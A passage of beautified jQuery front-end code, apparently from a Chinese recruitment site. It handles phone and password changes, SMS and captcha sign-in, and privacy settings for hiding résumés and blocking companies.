                n.parent().find(".verifyimg").click(),
                i.find(".sign-scan .qrcode-box img").attr("src", t),
                i.find(".uuid").val(e.qrId))
            },
            error: function(e) {}
        })
    },
    randomImage: function() {
        var e = $(".phone-form .operate-area");
        if (e.find(".randomkey").length && "" == e.find(".randomkey").val())
            return this.getRandomkey(e, $(".phone-form")),
            !1;
        e.find(".verifyimg").on("click", function() {
            $(this).attr("src", "/wapi/zppassport/captcha/?randomKey=" + $(this).closest(".form-row").find(".randomkey").val() + "&_r=" + (new Date).getTime())
        })
    },
    formValidate: function() {
        var n = this;
        $(".get-message-code").on("click", function() {
            $(this).closest("form");
            var i, e = n.formPhoneValidate(), t = n.formImageCodeValidate();
            e && t && (i = $(this),
            $.ajax({
                url: n.URL.sendsms.url,
                method: n.URL.sendsms.method,
                dataType: "json",
                data: {
                    randomKey: $(".phone-form .randomkey").val(),
                    regionCode: $(".phone-form .text-select").text(),
                    mobile: $(".phone-form .ipt-phone").val(),
                    captcha: $(".phone-form .ipt-image-code").val()
                },
                success: function(e) {
                    if (1 == e.rescode)
                        $(".get-message-code").html('<em class="num">60s</em> 后重试').addClass("count-down"),
                        n.countDown($(".count-down"), function() {
                            i.html("重新发送验证码").removeClass("count-down")
                        }),
                        $.toast({
                            content: "验证码短信已发送，请查收",
                            lock: !0,
                            type: "success",
                            wrapClass: "",
                            position: "top",
                            time: 3e3
                        });
                    else if (0 == e.rescode) {
                        var t = e.resmsg;
                        switch (e.errorType) {
                        case 1:
                            n.showError($(".ipt-phone"), t);
                            break;
                        case 2:
                            n.showError($(".ipt-image-code"), t);
                            break;
                        case 4:
                            n.showError($(".ipt-message-code"), t)
                        }
                    }
                },
                error: function() {
                    $.toast({
                        content: "网络错误修改失败",
                        lock: !0,
                        type: "error",
                        wrapClass: "",
                        position: "top",
                        time: 3e3
                    })
                }
            }))
        })
    },
    countDown: function(e, t) {
        var i = this
          , n = parseInt(e.find(".num").text().replace("s"), 10);
        i.interCount = setInterval(function() {
            n--,
            e.find(".num").text(n + "s"),
            n <= 0 && (t(),
            clearInterval(i.interCount),
            i.interCount = null)
        }, 1e3)
    },
    formPhoneValidate: function() {
        this.removeError($(".ipt-phone"));
        var e = $(".ipt-phone").val()
          , t = $(".text-select").text();
        return e.length ? /^\D+$/.test(e) ? ($(".ipt-phone").val(""),
        this.showError($(".ipt-phone"), "请输入正确的手机号"),
        $(".ipt-phone").focus(),
        !1) : ("+86" != t || /^(1[3456789][0-9]{9})$/.test(e)) && !!/^(\d{6,11})$/.test(e) || (this.showError($(".ipt-phone"), "请输入正确的手机号"),
        $(".ipt-phone").focus(),
        !1) : (this.showError($(".ipt-phone"), "请输入手机号"),
        !1)
    },
    formMessageCodeValidate: function() {
        this.removeError($(".ipt-message-code"));
        var e = $(".ipt-message-code").val();
        return e.length ? "" != e && e.match(/^.{4,6}$/) ? !e.match(/\D+/) || ($(".ipt-message-code").val(""),
        this.showError($(".ipt-message-code"), "短信验证码错误"),
        $(".ipt-message-code").focus(),
        !1) : (this.showError($(".ipt-message-code"), "短信验证码错误"),
        $(".ipt-message-code").focus(),
        !1) : (this.showError($(".ipt-message-code"), "请输入短信验证码"),
        $(".ipt-message-code").focus(),
        !1)
    },
    formImageCodeValidate: function() {
        this.removeError($(".ipt-image-code"));
        var e = $(".ipt-image-code").val();
        return e.length ? "" != e && e.match(/^.{4}$/) ? !e.match(/[\u4e00-\u9fa5]/) || ($(".ipt-image-code").val(""),
        this.showError($(".ipt-image-code"), "图片验证码错误"),
        $(".ipt-image-code").focus(),
        !1) : (this.showError($(".ipt-image-code"), "图片验证码错误"),
        $(".ipt-image-code").focus(),
        !1) : (this.showError($(".ipt-image-code"), "请输入图片验证码"),
        $(".ipt-image-code").focus(),
        !1)
    },
    showError: function(e, t) {
        e.addClass("ipt-error"),
        e.parent(".ipt-wrap").length && e.parent(".ipt-wrap").parent(".form-row").append('<div class="tip-text">' + t + "</div>"),
        e.parent(".cell-wrap").length && (e.parent(".cell-wrap").parent(".form-row").find(".tip-text").remove(),
        e.parent(".cell-wrap").parent(".form-row").append('<div class="tip-text">' + t + "</div>"))
    },
    lisLength: function() {
        return $(".sentence-list ul li").length
    },
    removeError: function(e) {
        e.removeClass("ipt-error"),
        (e.parent(".ipt-wrap").length ? e.parent(".ipt-wrap") : e.parent(".cell-wrap")).parent(".form-row").find(".tip-text").remove()
    },
    confirmChangePhone: function() {
        var n = this;
        $(".phone-form").on("submit", function(e) {
            $(this);
            e.preventDefault();
            var e = n.formPhoneValidate()
              , t = n.formMessageCodeValidate()
              , i = n.formImageCodeValidate();
            e && t && i && $.ajax({
                url: n.URL.mobile.url,
                method: n.URL.mobile.method,
                dataType: "json",
                data: {
                    randomKey: $(".phone-form .randomkey").val(),
                    regionCode: $(".phone-form .text-select").html(),
                    mobile: $(".phone-form .ipt-phone").val(),
                    captcha: $(".phone-form .ipt-image-code").val(),
                    smsCode: $(".phone-form .ipt-message-code").val()
                },
                success: function(e) {
                    if (1 == e.rescode)
                        $.toast({
                            content: "手机号修改成功，请重新登录",
                            lock: !0,
                            type: "success",
                            wrapClass: "",
                            position: "top",
                            time: 3e3
                        }),
                        setTimeout(function() {
                            window.location.href = "/web/zppassport/logout"
                        }, 1e3);
                    else if (0 == e.rescode) {
                        var t = e.resmsg;
                        switch (e.errorType) {
                        case 1:
                            n.showError($(".ipt-phone"), t);
                            break;
                        case 2:
                            n.showError($(".ipt-image-code"), t);
                            break;
                        case 3:
                            n.showError($(".ipt-message-code"), t)
                        }
                    }
                },
                error: function() {
                    $.toast({
                        content: "网络错误修改失败",
                        lock: !0,
                        type: "error",
                        wrapClass: "",
                        position: "top",
                        time: 3e3
                    })
                }
            })
        })
    },
    refreshPage: function(e) {
        setTimeout(function() {
            $(".account-container .set-nav ul li").eq(e).click()
        }, 300)
    },
    confirmChangePassword: function() {
        var n = this;
        $(".pwd-form").on("submit", function(e) {
            var t, i;
            e.preventDefault(),
            $(this).find(".form-btn .btn-origin-pwd").length ? (e.preventDefault(),
            t = n.pwdConfirm(),
            i = n.pwdConfirmAgain(),
            t && i && $.ajax({
                url: n.URL.password.url,
                method: n.URL.password.method,
                dataType: "json",
                data: {
                    newPassword: $(".pwd-form .ipt-pwd-orginal").val()
                },
                success: function(e) {
                    1 == e.rescode ? ($.toast({
                        content: "密码修改成功，请重新登录",
                        lock: !0,
                        type: "success",
                        wrapClass: "",
                        position: "top",
                        time: 3e3
                    }),
                    setTimeout(function() {
                        window.location.href = "/web/zppassport/logout"
                    }, 1e3)) : (e = e.resmsg,
                    n.showError($(".ipt-pwd-orginal"), e))
                },
                error: function() {}
            })) : $(this).find(".form-btn .btn-confirm-change-pwd").length && (e.preventDefault(),
            n.changePasswordConfirmSet())
        })
    },
    pwdConfirm: function() {
        var e = $(".ipt-pwd-orginal").val();
        return this.removeError($(".ipt-pwd-orginal")),
        e.length ? !!/^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]{6,20}$/.test(e) || (this.showError($(".ipt-pwd-orginal"), "请设置6-20位数字与字母组合密码"),
        $(".ipt-pwd-orginal").val(""),
        $(".ipt-pwd-orginal").focus(),
        !1) : (this.removeError($(".ipt-pwd-orginal")),
        this.showError($(".ipt-pwd-orginal"), "请输入密码"),
        !1)
    },
    pwdConfirmAgain: function() {
        var e = $(".ipt-pwd-orginal-confirm").val()
          , t = $(".ipt-pwd-orginal").val();
        return this.removeError($(".ipt-pwd-orginal-confirm")),
        e.length ? t === e || (this.showError($(".ipt-pwd-orginal-confirm"), "两次输入密码不一致"),
        $(".ipt-pwd-orginal-confirm").focus(),
        !1) : (this.removeError($(".ipt-pwd-orginal-confirm")),
        this.showError($(".ipt-pwd-orginal-confirm"), "请重复输入密码"),
        !1)
    },
    oldPassword: function() {
        var e = $(".ipt-pwd-old");
        return this.removeError(e),
        !!e.val().length || (this.showError(e, "请输入旧密码"),
        e.focus(),
        !1)
    },
    newPassword: function() {
        var e = $(".ipt-pwd-new")
          , t = ($(".ipt-pwd-old").val(),
        this.removeError(e),
        e.val());
        return t.length ? !!/^(?![0-9]+$)(?![a-zA-Z]+$)[0-9A-Za-z]{6,20}$/.test(t) || (this.showError(e, "请设置6-20位数字与字母组合密码"),
        e.focus(),
        !1) : (this.showError(e, "请输入新密码"),
        e.focus(),
        !1)
    },
    setConfirmChangePassword: function() {
        var e = $(".ipt-pwd-confirm")
          , t = $(".ipt-pwd-new").val()
          , i = (this.removeError(e),
        e.val());
        return i.length ? t === i || (this.showError(e, "两次输入密码不一致"),
        e.focus(),
        !1) : (this.showError(e, "请再次输入新密码"),
        e.focus(),
        !1)
    },
    changePasswordConfirmSet: function() {
        var i = this
          , e = i.oldPassword()
          , t = i.newPassword()
          , n = i.setConfirmChangePassword();
        e && t && n && $.ajax({
            url: i.URL.password.url,
            method: i.URL.password.method,
            dataType: "json",
            data: {
                oldPassword: $(".pwd-form .ipt-pwd-old").val(),
                newPassword: $(".pwd-form .ipt-pwd-new").val()
            },
            success: function(e) {
                if (1 == e.rescode)
                    $.toast({
                        content: "密码修改成功，请重新登录",
                        lock: !0,
                        type: "success",
                        wrapClass: "",
                        position: "top",
                        time: 3e3
                    }),
                    setTimeout(function() {
                        window.location.href = "/web/zppassport/logout"
                    }, 1e3);
                else if (0 == e.rescode) {
                    var t = e.resmsg;
                    switch (e.errorType) {
                    case 1:
                        i.showError($(".ipt-pwd-old"), t);
                        break;
                    case 2:
                        i.showError($(".ipt-pwd-new"), t)
                    }
                    i.showError($(".ipt-pwd-orginal"), t)
                }
            },
            error: function() {}
        })
    },
    chatUseSentence: function() {
        $(".account-container .sentence-list ul li").length ? $(".set-usalbox .title").length ? ($(".no-chat-wrap").addClass("hide"),
        $(".set-usalbox .title").removeClass("hide")) : ($(".set-usalbox .set-item").prepend('<h3 class="title">常用语</h3>'),
        $(".no-chat-wrap").addClass("hide")) : $(".no-chat-wrap").length ? ($(".no-chat-wrap").removeClass("hide"),
        $(".set-usalbox .title").addClass("hide")) : ($(".account-container .set-usalbox .set-item").prepend('<div class="no-chat-wrap"><h3 class="no-chat">您还没有常用回复语</h3><div class="no-chat-subtitle">设置常用回复语，可在沟通聊天时直接选用，减少重复输入</div></div>'),
        $(".account-container .set-usalbox .set-item h3.title").addClass("hide"))
    }
})
  , QuickSign = ($(function() {
    0 < window.location.href.indexOf("/geek/account/management") && GeekAccount.init()
}),
{
    init: function() {
        var t;
        $(".top-sign-box").length && ($(".top-sign-box").find(".ipt-code").attr("maxlength", "6"),
        t = $(".top-sign-box"),
        $(".show-code-box").on("click", function() {
            var e;
            $(this).hasClass("btn-disabled") || ("" != (e = $(t).find(".ipt-phone").val()) && /^(1[3456789][0-9]{9})$/.test(e) ? ($(".code-form-box").show(),
            QuickSign.Verify || (QuickSign.Verify = new VerifyCodeSDK({
                dom: $(".code-form-box .row-code")[0],
                success: function(e) {
                    QuickSign.VerrifySuccessCallback(e)
                },
                ready: function(e) {
                    QuickSign.VerrifyReadyCallback(e)
                },
                fail: function(e) {
                    try {
                        $(".code-form-box").find("input[name=phone]").val();
                        e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                    } catch (e) {}
                }
            }))) : $.toast({
                content: "请输入正确的手机号",
                type: "warning"
            }))
        }),
        t.find("form .registe-btn").on("click", function(e) {
            e.preventDefault(),
            $(this).hasClass("btn-disabled") || QuickSign.checkForm($(this).closest("form"))
        }),
        t.find(".btn-sms").on("click", function() {
            var e = $(this).closest("form");
            QuickSign.checkForm(e, !0)
        }),
        t.find(".verifyimg").on("click", function() {
            $(this).attr("src", "/wapi/zppassport/captcha/?randomKey=" + $(this).closest(".code-form-content").find(".randomkey").val() + "&_r=" + (new Date).getTime());
            try {
                _T.sendEvent("signin_verify_code")
            } catch (e) {}
        }),
        QuickSign.getRandomkey(t, t.find("form")),
        $("body").on("click", function(e) {
            $(e.target).parents(".step-form").length || $(".code-form-box").hide()
        }),
        QuickSign.VERRIFYCODETYPE = 1,
        QuickSign.VerrifySuccessCallback = function(e) {
            var t = $(e.el).parents("form");
            1 == e.type ? (e.challenge,
            e.validate,
            e.seccode,
            t.find('input[name="challenge"]').length || (t.append('<input type="hidden" name="challenge"></input>'),
            t.append('<input type="hidden" name="validate"></input>'),
            t.append('<input type="hidden" name="seccode"></input>')),
            t.find('input[name="challenge"]').val(e.challenge),
            t.find('input[name="validate"]').val(e.validate),
            t.find('input[name="seccode"]').val(e.seccode)) : 2 == e.type ? (t.find('input[name="csessionId"]').length || (t.append('<input type="hidden" name="csessionId"></input>'),
            t.append('<input type="hidden" name="csig"></input>'),
            t.append('<input type="hidden" name="ctoken"></input>')),
            t.find('input[name="csessionId"]').val(e.csessionId),
            t.find('input[name="csig"]').val(e.csig),
            t.find('input[name="ctoken"]').val(e.ctoken)) : 3 == e.type ? (t.find('input[name="randKey"]').length || (t.append('<input type="hidden" name="randKey"></input>'),
            t.append('<input type="hidden" name="captcha"></input>')),
            t.find('input[name="randKey"]').val(e.randKey)) : 4 == e.type && (t.find('input[name="validate"]').length || t.append('<input type="hidden" name="validate"></input>'),
            t.find('input[name="validate"]').val(e.validate)),
            3 != e.type && $(".top-sign-box").length && setTimeout(function() {
                QuickSign.checkForm($(".top-sign-box").find(".btn-sms").closest("form"), !0)
            }, 500)
        }
        ,
        QuickSign.VerrifyReadyCallback = function(e) {
            var t = $(e.el).parents("form");
            QuickSign.VERRIFYCODETYPE = e.type,
            1 == e.type ? (t.attr("action", "/wapi/zppassport/login/phoneV2"),
            t.find(".show-code-box").attr("data-url", "/wapi/zppassport/send/smsCodeV2")) : 2 == e.type ? (t.attr("action", "/wapi/zppassport/login/phone"),
            t.find(".show-code-box").attr("data-url", "/wapi/zppassport/send/smsCode")) : 3 == e.type ? (t.attr("action", "/wapi/zppassport/login/phoneV3"),
            t.find(".show-code-box").attr("data-url", "/wapi/zppassport/send/smsCodeV3")) : 4 == e.type && (t.attr("action", "/wapi/zppassport/login/phoneByWy"),
            t.find(".show-code-box").attr("data-url", "/wapi/zppassport/send/smsCodeByWy")),
            3 == e.type && t.find(".getcode-btn").show()
        }
        )
    },
    getRandomkey: function(i, e) {
        var t = (e = e).find(".ipt-code").attr("data-url")
          , n = e.find(".randomkey");
        "" == n.val() && $.ajax({
            url: t,
            type: "POST",
            dataType: "json",
            data: {
                pk: $("#page_key_name").val()
            },
            success: function(e) {
                var t;
                1 == e.rescode && (t = "/wflow/zpweixin/qrcode/getqrcode?content=" + e.qrId + "&w=200&h=200",
                i.find(".randomkey").val(e.randomKey),
                n.parent().find(".verifyimg").click(),
                i.find(".sign-scan .qrcode-box img").attr("src", t),
                i.find(".uuid").val(e.qrId))
            },
            error: function(e) {}
        })
    },
    callbackRegister: function(e, t) {
        var i = getQueryString("from") || ""
          , n = getQueryString("fromUrl") || "";
        try {
            var a = e.attr("ka");
            a && _T.sendEvent(a)
        } catch (e) {}
        var o, a = "g";
        "1" == e.find('input[name="purpose"]').val() && (a = "b");
        try {
            _T.sendEvent(e.closest(".sign-form").data("flow") + "_done_" + a)
        } catch (e) {}
        t.commonDevice ? (o = t.webHost + "/web/geek/user-safe?uuid=" + t.uuid,
        i && n && (o = o + "&from=" + i + "&fromUrl=" + n),
        window.location.href = o) : i && n ? Sign.safeJump(n) : t.isCompletion ? t.toUrl ? ($.toast({
            content: "登录成功",
            type: "success"
        }),
        o = "",
        o = -1 != t.toUrl.indexOf("http") ? t.toUrl : "https://www.zhipin.com" + t.toUrl,
        setTimeout(function() {
            window.location.href = decodeURIComponent(o)
        }, 500)) : window.location.reload() : (e = "",
        1 == t.identity ? 0 == t.compStep ? (e = "登录成功",
        setTimeout(function() {
            window.location.href = decodeURIComponent(t.toUrl)
        }, 500)) : 1 == t.compStep ? (e = t.autoRegister ? "注册成功，正在为您跳转到完善页面" : "登录成功，正在为您跳转到完善页面",
        setTimeout(function() {
            window.location.href = t.webHost + "/web/boss/guide/"
        }, 500)) : 2 == t.compStep && (e = t.autoRegister ? "注册成功，正在为您跳转到完善页面" : "登录成功，正在为您跳转到完善页面",
        setTimeout(function() {
            window.location.href = t.webHost + "/web/boss/guide/job/"
        }, 500)) : (e = t.autoRegister ? "注册成功，正在为您跳转到完善页面" : "登录成功，正在为您跳转到完善页面",
        setTimeout(function() {
            window.location.href = t.webHost + "/web/geek/guide"
        }, 500)),
        $.toast({
            content: e,
            type: "success"
        }))
    },
    countDown: function(e, t) {
        var i = parseInt(e.find(".num").text().replace("s"), 10);
        Sign.interCount = setInterval(function() {
            i--,
            e.find(".num").text(i + "s"),
            i <= 0 && (t(),
            clearInterval(Sign.interCount),
            Sign.interCount = null)
        }, 1e3)
    },
    checkForm: function(e, t) {
        var i = (e = e).find(".ipt-phone")
          , n = e.find(".ipt-sms")
          , a = "";
        if (1 == QuickSign.VERRIFYCODETYPE ? a = e.find("input[name=challenge]") : 2 == QuickSign.VERRIFYCODETYPE ? a = e.find("input[name=csessionId]") : 4 == QuickSign.VERRIFYCODETYPE && (a = e.find("input[name=validate]")),
        i.length) {
            if ("" == i.val()) {
                $.toast({
                    content: "请输入正确的手机号",
                    type: "warning"
                }),
                i.focus();
                try {
                    _T.sendEvent(i.closest(".sign-form").data("flow") + "_mobile")
                } catch (e) {}
                return !1
            }
            if (/^\D+$/.test(i.val()))
                return i.val(""),
                !1;
            if (!/^(1[3456789][0-9]{9})$/.test(i.val())) {
                $.toast({
                    content: "请输入正确的手机号",
                    type: "warning"
                }),
                i.focus();
                try {
                    _T.sendEvent(i.closest(".sign-form").data("flow") + "_mobile")
                } catch (e) {}
                return !1
            }
        }
        if (3 != QuickSign.VERRIFYCODETYPE) {
            if (a.length) {
                if ("" == a.val())
                    return $.toast({
                        content: "请滑动完成验证",
                        type: "warning"
                    }),
                    a.focus(),
                    !1;
                Sign.hideError(a)
            }
        } else {
            i = (a = e.find(".input_code")).val();
            if (!i)
                return $.toast({
                    content: "请填写图片验证码",
                    type: "warning"
                }),
                a.focus(),
                !1;
            e.find("input[name=captcha]").val(i),
            Sign.hideError(a)
        }
        if (n.length && !t) {
            if ("" == n.val())
                return $.toast({
                    content: "请填写短信验证码",
                    type: "warning"
                }),
                n.focus(),
                !1;
            if (!n.val().match(/^.{4,6}$/))
                return $.toast({
                    content: "短信验证码错误",
                    type: "warning"
                }),
                n.focus(),
                !1;
            if (n.val().match(/\D+/))
                return $.toast({
                    content: "短信验证码错误",
                    type: "warning"
                }),
                n.val(""),
                n.focus(),
                !1
        }
        QuickSign.postData(e, t)
    },
    postData: function(formEl, isSms) {
        var formEl = formEl
          , btnSms = formEl.find(".show-code-box")
          , url = formEl.attr("action")
          , btnEl = formEl.find(".registe-btn");
        if (isSms) {
            if (btnSms.hasClass("btn-disabled"))
                return;
            url = btnSms.attr("data-url"),
            btnSms.addClass("btn-disabled").html("稍后")
        } else {
            if (btnEl.hasClass("btn-disabled"))
                return;
            btnEl.addClass("btn-disabled"),
            void 0 !== Sign && Sign.setJumpUrl(formEl),
            window.BossZhipinBridge && (formEl.find('input[name="environment"]').length || formEl.append('<input name="environment" type="hidden" />'),
            formEl.find('input[name="environment"]').val("BossZhipinBridge"))
        }
        formEl.find('input[name="pk"]').length || formEl.append('<input name="pk" type="hidden" />'),
        formEl.find('input[name="pk"]').val($("#page_key_name").val()),
        $.ajax({
            url: url,
            type: "post",
            dataType: "json",
            data: formEl.serialize(),
            success: function(result) {
                var result = result
                  , zpData = ("string" == typeof result && (result = eval("(" + result + ")")),
                result.zpData || {});
                if (0 !== result.code && new VerifyCodeSDK({
                    dom: formEl.find(".row-code")[0],
                    success: function(e) {
                        QuickSign.VerrifySuccessCallback(e)
                    },
                    ready: function(e) {
                        QuickSign.VerrifyReadyCallback(e)
                    },
                    fail: function(e) {
                        try {
                            formEl.find("input[name=phone]").val();
                            e && _T.sendTracking("verify_code_sdk_fail_" + JSON.stringify(e))
                        } catch (e) {}
                    }
                }),
                0 == result.code)
                    if (isSms)
                        if (2 == zpData.type)
                            $.toast({
                                content: result.message,
                                type: "warning"
                            }),
                            btnSms.html("获取").removeClass("count-down btn-disabled");
                        else {
                            $.toast({
                                content: "短信验证码已发送",
                                type: "success"
                            }),
                            $(".code-form-box").hide(),
                            -1 != window.location.href.indexOf("/wap/guide/base-new") ? (btnSms.html('(<em class="num">60s</em>)').addClass("count-down btn-disabled"),
                            btnSms.parents(".form-item").find(".ipt-sms").show(),
                            QuickSign.countDown(btnSms, function() {
                                btnSms.parents(".form-item").find(".ipt-sms").hide(),
                                btnSms.html("获取验证码").removeClass("count-down btn-disabled"),
                                GuideNew.resetVerrify(formEl)
                            })) : (btnSms.html('(<em class="num">60s</em>)').addClass("count-down btn-disabled"),
                            QuickSign.countDown(btnSms, function() {
                                btnSms.html("获取").removeClass("count-down btn-disabled")
                            })),
                            btnSms.parent().find(".ipt-sms").focus(),
                            formEl.append('<input type="hidden" name="rescode" value="1" />');
                            try {
                                _T.sendEvent("signin_register_send_sms")
                            } catch (e) {}
                        }
                    else
                        "undefined" != typeof GuideNew && "function" == typeof GuideNew.RegisterCallback ? GuideNew.RegisterCallback(formEl, zpData) : QuickSign.callbackRegister(formEl, zpData);
                else
                    1 == result.code ? ($.toast({
                        content: result.message,
                        type: "warning"
                    }),
                    isSms && btnSms.html("获取").removeClass("btn-disabled"),
                    formEl.find(".ipt-code").val(""),
                    formEl.find(".verifyimg").click()) : 6 == result.code ? $.toast({
                        content: "短信验证码错误",
                        type: "warning"
                    }) : -1 < Sign.loginLimitCode.indexOf(result.code) || 4942 <= result.code && result.code <= 4950 ? Sign.loginLimitTip(result.code, {
                        message: result.message,
                        closeCallback: function() {}
                    }) : ($.toast({
                        content: result.message,
                        type: "warning"
                    }),
                    isSms && btnSms.html("获取").removeClass("btn-disabled"),
                    formEl.find(".ipt-code").val(""),
                    formEl.find(".verifyimg").click());
                isSms || btnEl.removeClass("btn-disabled")
            },
            error: function(e) {
                $.toast({
                    content: "服务器错误，请稍后再试",
                    type: "warning"
                }),
                (isSms ? btnSms.html("获取") : btnEl).removeClass("btn-disabled")
            }
        })
    }
})
  , Settings = ($(function() {
    QuickSign.init()
}),
{
    init: function() {
        var t;
        Settings.post = function(e, t) {
            var i = $.Deferred();
            return $.ajax({
                url: e,
                data: t,
                type: "json",
                method: "post",
                success: function(e) {
                    1 == e.rescode ? i.resolve(e) : ($.toast({
                        type: "error",
                        content: e.resmsg
                    }),
                    i.reject(e))
                }
            }),
            i
        }
        ,
        Settings.page = 1,
        $(window).on("scroll", function() {
            t && clearTimeout(t);
            var e = $(".company-container").find(".loadmore");
            !e.hasClass("disabled") && e.is(":visible") && (t = setTimeout(function() {
                Settings.isVisiable(e.get(0)) && Settings.loadMore(e, $(".company-container .company-list"))
            }, 100))
        })
    },
    showLayer: function(e) {
        e = e.html();
        $.dialog({
            title: "",
            wrapClass: "layer-privacy",
            confirmText: "",
            cancelText: "",
            content: e,
            onOpen: function(t) {
                t.find(".btn-search").off("click").on("click", function() {
                    var e = filterXss($(this).prev(".ipt").val());
                    t.find(".description");
                    "" != e.trim() && Settings.searchCompany(e, t)
                }),
                $(document).off("keydown").on("keydown", function(e) {
                    13 == e.keyCode && (e = t.find(".search-box .ipt").val(),
                    t.find(".description"),
                    "" != e.trim() && Settings.searchCompany(e, t))
                })
            }
        })
    },
    setStatus: function(t) {
        var e = 1;
        if (t.hasClass("op-on")) {
            e = 0;
            try {
                _T.sendEvent("unhide_resume")
            } catch (e) {}
        } else
            try {
                _T.sendEvent("hide_resume")
            } catch (e) {}
        Settings.post("/geek/privacy/resumeStatus/update.json", {
            status: e
        }).then(function(e) {
            $.toast({
                type: "success",
                content: "操作成功"
            }),
            t.hasClass("op-off") ? t.removeClass("op-off").addClass("op-on").prev("span").text("已隐藏简历") : t.removeClass("op-on").addClass("op-off").prev("span").text("已开放简历")
        })
    },
    cancelMask: function(e) {
        var t = e.attr("data-id");
        e.hasClass("disabled") || (e.addClass("disabled"),
        Settings.post("/geek/privacy/maskCompany/delete.json", {
            comIds: t
        }).then(function() {
            e.parents("li").remove(),
            $.toast({
                type: "success",
                content: "操作成功"
            }),
            Account.setTab($(".set-nav").find("li[data-tab=privacy]")),
            e.removeClass("disabled")
        }))
    },
    searchCompany: function(o, s) {
        var r = s.find(".description");
        Settings.post("/autocomplete/maskcompany.json", {
            searchContent: o
        }).then(function(e) {
            var t = e.suggestList
              , e = ""
              , i = ""
              , n = "disabled";
            if (t.length) {
                for (var a = 0; a < t.length; a++)
                    t[a].mark ? i += '<li data-id="' + t[a].encryptComId + '">\t\t\t\t\t\t\t<label class="checkbox">\t\t\t\t\t\t\t\t<span class="gray">已屏蔽</span>\t\t\t\t\t\t\t</label>\t\t\t\t\t\t\t<div class="company-name">\t\t\t\t\t\t\t\t<p>' + t[a].company.name + '</p>\t\t\t\t\t\t\t\t<p class="gray">' + (null == t[a].desc ? "" : t[a].desc.hlname) + "</p>\t\t\t\t\t\t\t</div>\t\t\t\t\t\t</li>" : (i += '<li data-id="' + t[a].encryptComId + '">\t\t\t\t\t\t\t<label class="checkbox">\t\t\t\t\t\t\t\t<input type="checkbox" checked="checked">\t\t\t\t\t\t\t\t<span></span>\t\t\t\t\t\t\t</label>\t\t\t\t\t\t\t<div class="company-name">\t\t\t\t\t\t\t\t<p>' + t[a].company.name + '</p>\t\t\t\t\t\t\t\t<p class="gray">' + (null == t[a].desc ? "" : t[a].desc.hlname) + "</p>\t\t\t\t\t\t\t</div>\t\t\t\t\t\t</li>",
                    n = "");
                e = '<div class="search-result"><p class="gray">与“' + o + "”相关的公司，共" + t.length + '个</p>\t\t\t\t\t\t<ul class="result-list">' + i + '</ul></div>\t\t\t\t\t\t<div class="op">\t\t\t\t\t\t\t<div class="pull-right">\t\t\t\t\t\t\t\t<button class="btn ' + n + '">屏蔽所选公司</button>\t\t\t\t\t\t\t</div>\t\t\t\t\t\t\t<label class="checkbox check-all">\t\t\t\t\t\t\t\t<input type="checkbox" checked="checked" class="disabled">\t\t\t\t\t\t\t\t<span>全选</span>\t\t\t\t\t\t\t</label>\t\t\t\t\t\t</div>'
            } else
                e = '<div class="search-result"><p class="gray">与“' + o + "”相关的公司，共" + t.length + '个</p><div class="tips"><img src="' + staticPath + '/web/geek/images/settings-tip.png"><p class="gray">没有找到您搜索的公司</p></div></div>';
            r.html(e),
            r.find(".check-all input").on("change", function() {
                var e = r.find(".result-list input");
                Settings.selectAll($(this), e)
            }),
            r.find(".checkbox input").on("change", function() {
                r.find(".check-all input").prop("checked", !0),
                $(this).prop("checked") ? r.find(".checkbox input").each(function() {
                    0 == $(this).prop("checked") && r.find(".check-all input").prop("checked", !1)
                }) : r.find(".check-all input").prop("checked", !1)
            }),
            r.find(".op .btn").on("click", function() {
                var e, t;
                $(this).hasClass("disabled") || (e = [],
                r.find(".result-list li").each(function() {
                    $(this).find("input").is(":checked") && e.push($(this).attr("data-id"))
                }),
                e.length ? (t = e.join(","),
                Settings.post("/geek/privacy/maskCompany/add.json", {
                    comIds: t
                }).then(function(e) {
                    if (e.rescode) {
                        $.toast({
                            type: "success",
                            content: "操作成功"
                        });
                        try {
                            _T.sendEvent("block_selected_comp")
                        } catch (e) {}
                        Account.setTab($(".set-nav").find("li[data-tab=privacy]"))
                    }
                    s.remove()
                })) : ($(this).prev("span").remove(),
                $(this).before("<span>至少选择一个公司</span>")))
            });
            try {
                _T.sendEvent("search_block_comp")
            } catch (e) {}
        })
    },
    selectAll: function(e, t) {
        e[0].checked ? t.prop("checked", !0) : t.prop("checked", !1)
    },
    isVisiable: function(e) {
        e = e.getBoundingClientRect();
        return 0 < e.top && 0 < window.innerHeight - e.top || e.top < 0 && 0 <= e.bottom
    },
    loadMore: function(n, a) {
        var e = n.attr("data-url")
          , o = "";
        Settings.page++,
        $.get(e, {
            page: Settings.page
        }, function(e) {
            if (e.rescode) {
                for (var t = e.maskCompanyList, i = 0; i < t.length; i++)
                    o += '<li><span class="link-cancel" data-id="' + t[i].encryptComId + '">取消屏蔽</span>' + t[i].comName + "</li>";
                e.hasMore || n.text("没有更多了").addClass("disabled"),
                a.append(o)
            }
        })
    }
})
  , preview = ($(function() {
    Settings.init()
}),
{
    doc: $(document),
    init: function() {
        this.expectPos = this.doc.find(".expect-pos"),
        this.optionWrapper = this.doc.find(".pos-select .option-wrapper"),
        this.loadBtn = this.doc.find(".frame-footer .btn"),
        this.positionToggle(),
        this.selectionHide(),
        this.positionChange()
    },
    positionToggle: function() {
        this.expectPos.on("click", ".option-slted", function() {
            preview.optionWrapper.toggle()
        })
    },
    changeHref: function(e) {
        var t = (t = this.loadBtn.attr("href")).substr(0, t.indexOf("&")) + "&expectId=" + e;
        this.loadBtn.attr("href", t)
    },
    positionChange: function() {
        this.expectPos.on("click", ".option-wrapper li", function() {
            $(".option-slted .option-value").html($(this).html()),
            $(".pos-slted").html($(this).html()),
            preview.optionWrapper.hide();
            var e = $(this).data("id");
            preview.changeHref(e)
        })
    },
    selectionHide: function() {
        this.doc.on("click", function(e) {
            "option-value" != e.target.className && "pos-tip" != e.target.className && preview.optionWrapper.hide()
        })
    }
})
  , isOldCompetitivePage = (preview.init(),
$("#competitive-main").length && $("#container").length)
  , text = ($(function() {
    var t, i;
    isOldCompetitivePage && (t = [],
    i = [],
    _COMPETITIVE_PAGE.reportDataJson || (_COMPETITIVE_PAGE.reportDataJson = _COMPETITIVE_PAGE.data),
    (_COMPETITIVE_PAGE.reportDataJson.General_Market || []).forEach(function(e) {
        t.push(e.count)
    }),
    (_COMPETITIVE_PAGE.reportDataJson.General || []).forEach(function(e) {
        i.push(e.count)
    }),
    $("#container").highcharts({
        chart: {
            polar: !0,
            type: "area",
            animation: !1,
            tooltip: !1,
